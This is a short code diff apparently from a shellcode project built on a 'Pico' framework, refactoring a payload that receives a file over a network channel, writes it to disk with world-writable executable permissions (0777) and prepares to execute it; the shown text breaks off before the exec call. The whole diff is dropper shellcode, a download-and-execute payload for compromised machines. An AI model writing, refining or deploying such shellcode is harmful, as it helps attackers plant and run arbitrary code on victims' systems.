@@ -2,6 +2,7 @@
 #include <pico.h>
 
 using namespace Pico;
+using namespace Pico::Filesystem;
 
 SHELLCODE_ENTRY
 {
@@ -16,11 +17,11 @@ SHELLCODE_ENTRY
     channel.recv(&file_sz, sizeof(file_sz));
     
     /* Read the file data. */
-    void *file_contents = Memory::allocate(file_sz, Memory::READ | Memory::WRITE | Memory::EXEC);
-    channel.recv(file_contents, file_sz);
+    Memory::Buffer file_contents(file_sz, Memory::READ | Memory::WRITE);
+    channel.recv(file_contents.pointer(), file_sz);
 
     /* Drop executable file. */
-    drop_file(file_path, S_IRUSR|S_IWUSR|S_IXUSR, file_contents, file_sz); 
+    File::create(file_path, File::TRUNCATE | File::WRITE, 0777).write(file_contents);
 
     char *const argv[] = { NULL };
     char *const envp[] = { NULL };
